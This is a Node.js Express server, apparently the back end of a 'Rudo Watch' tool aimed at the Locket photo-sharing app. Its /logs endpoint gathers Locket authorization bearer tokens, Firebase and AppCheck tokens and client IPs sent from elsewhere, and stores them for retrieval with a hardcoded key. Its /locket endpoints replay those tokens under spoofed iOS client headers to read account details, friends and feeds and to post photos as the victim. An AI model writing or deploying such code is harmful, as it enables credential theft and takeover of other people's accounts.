const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage + file backup
let logsData = [];
const LOG_FILE = '/tmp/locket_logs.txt';

// Hàm đọc logs
const readLogs = () => logsData;

// Hàm ghi logs (memory + file)
const writeLogs = (logs) => {
  logsData = logs;
  // Ghi ra file txt
  try {
    const logText = logs.map(log => {
      return `[${log.timestamp}] App: ${log.app}\n` +
             `  Authorization: ${log.authorization || 'N/A'}\n` +
             `  FirebaseToken: ${log.firebaseToken || 'N/A'}\n` +
             `  AppCheck: ${log.appCheck || 'N/A'}\n` +
             `  UserAgent: ${log.userAgent || 'N/A'}\n` +
             `  IP: ${log.ip || 'N/A'}\n` +
             `-------------------------------------------`;
    }).join('\n\n');
    fs.writeFileSync(LOG_FILE, logText, 'utf8');
  } catch (e) {
    console.error('[WRITE FILE ERROR]', e.message);
  }
};

// API endpoint nhận log
app.post('/logs', (req, res) => {
  try {
    const { 
      app: appName, 
      authorization, 
      firebaseToken, 
      appCheck, 
      userAgent,
      timestamp 
    } = req.body;
    
    // Lấy IP thực từ request
    const realIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.ip;

    const logEntry = {
      id: Date.now(),
      timestamp: timestamp || new Date().toISOString(),
      app: appName || 'Unknown',
      authorization: authorization || null,
      firebaseToken: firebaseToken || null,
      appCheck: appCheck || null,
      userAgent: userAgent || req.headers['user-agent'] || null,
      ip: realIP
    };

    // Đọc logs hiện tại và thêm mới
    const logs = readLogs();
    logs.push(logEntry);
    writeLogs(logs);

    console.log(`[LOG] New entry from ${appName} - IP: ${realIP}`);

    res.status(200).json({ 
      success: true, 
      message: 'Log saved successfully',
      id: logEntry.id 
    });

  } catch (error) {
    console.error('[ERROR]', error.message);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to save log' 
    });
  }
});

// API endpoint xem logs (bảo mật bằng secret key)
app.get('/logs', (req, res) => {
  const secretKey = req.query.key;
  const format = req.query.format; // ?format=txt để download txt
  
  // Thay đổi secret key này
  if (secretKey !== 'ductoandev_secret_2026') {
    return res.status(401).json({ 
      success: false, 
      message: 'Unauthorized' 
    });
  }

  const logs = readLogs();
  
  // Download dạng txt
  if (format === 'txt') {
    const logText = logs.map(log => {
      return `[${log.timestamp}] App: ${log.app}\n` +
             `  Authorization: ${log.authorization || 'N/A'}\n` +
             `  FirebaseToken: ${log.firebaseToken || 'N/A'}\n` +
             `  AppCheck: ${log.appCheck || 'N/A'}\n` +
             `  UserAgent: ${log.userAgent || 'N/A'}\n` +
             `  IP: ${log.ip || 'N/A'}\n` +
             `-------------------------------------------`;
    }).join('\n\n');
    
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=locket_logs.txt');
    return res.send(logText || 'No logs yet');
  }
  
  // Trả về JSON mặc định
  res.json({
    success: true,
    total: logs.length,
    logs: logs
  });
});

// API endpoint xóa logs
app.delete('/logs', (req, res) => {
  const secretKey = req.query.key;
  
  if (secretKey !== 'ductoandev_secret_2026') {
    return res.status(401).json({ 
      success: false, 
      message: 'Unauthorized' 
    });
  }

  writeLogs([]);
  res.json({
    success: true,
    message: 'All logs cleared'
  });
});

// Health check
app.get('/', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Rudo Watch Backend is running',
    version: '1.0.0'
  });
});

// ═══════════════════════════════════════════════════════════════
// 🔐 LOCKET LOGIN TOOL - Đăng nhập bằng Authorization token
// ═══════════════════════════════════════════════════════════════


// Lấy thông tin user từ Firebase (dùng idToken/authorization)
app.post('/locket/login', async (req, res) => {
  try {
    const { authorization, apiKey } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    // Extract token (remove "Bearer " prefix if present)
    const idToken = authorization.replace('Bearer ', '');
    
    // Dùng apiKey từ request hoặc default
    const FIREBASE_API_KEY = apiKey;

    // Gọi Firebase Identity Toolkit API
    const response = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=${FIREBASE_API_KEY}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1',
        'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
        'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
        'X-Ios-Bundle-Identifier': 'com.locket.Locket'
      },
      body: JSON.stringify({ idToken })
    });

    const data = await response.json();
    
    if (response.ok && data.users && data.users.length > 0) {
      const user = data.users[0];
      res.json({
        success: true,
        message: 'Login successful',
        user: {
          localId: user.localId,
          email: user.email,
          emailVerified: user.emailVerified,
          displayName: user.displayName,
          photoUrl: user.photoUrl,
          createdAt: user.createdAt,
          lastLoginAt: user.lastLoginAt,
          providerUserInfo: user.providerUserInfo
        }
      });
    } else {
      res.status(response.status || 400).json({
        success: false,
        message: 'Login failed',
        error: data.error || data
      });
    }

  } catch (error) {
    console.error('[LOCKET LOGIN ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// Gửi ảnh lên Locket
app.post('/locket/send', async (req, res) => {
  try {
    const { authorization, imageUrl, caption, friends } = req.body;
    
    if (!authorization || !imageUrl) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization or imageUrl'
      });
    }

    // Gọi Locket API để gửi ảnh
    const response = await fetch('https://api.locketcamera.com/postMomentV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({
        data: {
          thumbnail_url: imageUrl,
          media_url: imageUrl,
          caption: caption || '',
          sent_to_all: friends ? false : true,
          recipients: friends || []
        }
      })
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        message: 'Photo sent successfully',
        result: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to send photo',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET SEND ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to send photo',
      error: error.message
    });
  }
});

// Lấy danh sách bạn bè
app.post('/locket/friends', async (req, res) => {
  try {
    const { authorization } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    const response = await fetch('https://api.locketcamera.com/fetchUserV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({})
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        friends: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to get friends',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET FRIENDS ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to get friends',
      error: error.message
    });
  }
});

// Lấy feed (ảnh từ bạn bè)
app.post('/locket/feed', async (req, res) => {
  try {
    const { authorization } = req.body;
    
    if (!authorization) {
      return res.status(400).json({
        success: false,
        message: 'Missing authorization token'
      });
    }

    const response = await fetch('https://api.locketcamera.com/getLatestMomentV2', {
      method: 'POST',
      headers: {
        'Authorization': authorization,
        'Content-Type': 'application/json',
        'User-Agent': 'com.locket.Locket/2.32.1 iPhone/26.0 hw/iPhone12_1'
      },
      body: JSON.stringify({})
    });

    const data = await response.json();
    
    if (response.ok) {
      res.json({
        success: true,
        feed: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'Failed to get feed',
        error: data
      });
    }

  } catch (error) {
    console.error('[LOCKET FEED ERROR]', error.message);
    res.status(500).json({
      success: false,
      message: 'Failed to get feed',
      error: error.message
    });
  }
});

// Start server
const HOST = '0.0.0.0';
app.listen(PORT, HOST, () => {
  console.log(`Server running on ${HOST}:${PORT}`);
  console.log(`Logs endpoint: POST /logs`);
  console.log(`View logs: GET /logs?key=ductoandev_secret_2026`);
});
